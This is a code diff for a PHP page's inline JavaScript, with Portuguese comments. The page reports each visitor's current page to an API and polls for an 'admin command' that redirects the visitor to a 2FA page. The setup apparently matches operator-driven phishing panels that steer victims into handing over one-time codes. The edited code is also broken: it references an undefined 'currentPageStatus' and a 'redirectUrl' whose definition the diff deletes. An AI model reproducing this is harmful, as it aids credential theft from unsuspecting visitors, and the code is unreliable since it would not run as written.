@@ -211,57 +211,48 @@ if (isset($_COOKIE['identificador_cliente'])) {
             const currentStatus = statusMap[currentPage] || 'Página Desconhecida';
 
             // Função que envia o "ping" para a API
-            async function sendStatusUpdate() {
+            async function announceCurrentLocation() {
                 try {
+                    // Usa a API de update para definir o status correto desta página
                     await fetch('api_update_status.php', {
                         method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({ status: currentStatus })
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ status: currentPageStatus }) // Note que não envia 'id'
                     });
-                    // Não precisamos fazer nada com a resposta, apenas enviar.
+                    console.log(`Status definido para: ${currentPageStatus}`);
                 } catch (error) {
-                    // Se falhar, loga no console sem incomodar o usuário.
-                    console.error('Falha ao enviar atualização de status:', error);
+                    console.error('Falha ao anunciar localização:', error);
                 }
             }
 
-            // Envia o primeiro status imediatamente ao carregar a página
-            sendStatusUpdate();
-
-            // Configura para enviar o status a cada 2000 milissegundos (2 segundos)
-            setInterval(sendStatusUpdate, 2000);
-        })();
-    </script>
-    <script>
-        (function() {
-            // Pega a URL de redirecionamento que o PHP definiu
-            const redirectUrl = "<?php echo $redirect_target_2fa; ?>";
-
-            async function checkAdminCommand() {
+            /**
+             * Função 2: Fica ouvindo por NOVOS comandos do admin.
+             */
+            async function listenForAdminCommands() {
                 try {
+                    // Usa a API de checagem
                     const response = await fetch('api_check_status.php');
                     const data = await response.json();
 
-                    console.log('Status atual:', data.status); 
-
-                    if (data.status === 'redirecionar_para_2fa') {
-                        // Para a verificação para não redirecionar em loop
-                        clearInterval(statusInterval);
-                        
+                    if (data && data.status === 'redirecionar_para_2fa') {
+                        // Comando recebido! Para de ouvir e redireciona.
+                        clearInterval(commandListenerInterval);
                         console.log('Comando do admin recebido! Redirecionando para:', redirectUrl);
-                        
-                        // Redireciona o usuário para o alvo correto (desktop ou mobile)
                         window.location.href = redirectUrl;
                     }
                 } catch (error) {
-                    console.error('Erro ao verificar status:', error);
+                    console.error('Erro ao ouvir por comandos:', error);
                 }
             }
 
-            // Inicia a verificação a cada 3 segundos
-            const statusInterval = setInterval(checkAdminCommand, 3000);
+            // --- EXECUÇÃO ---
+            
+            // 1. Anuncia a localização atual imediatamente para limpar o status antigo.
+            announceCurrentLocation();
+
+            // 2. Começa a ouvir por novos comandos do admin a cada 3 segundos.
+            const commandListenerInterval = setInterval(listenForAdminCommands, 3000);
+
         })();
     </script>
 </body>
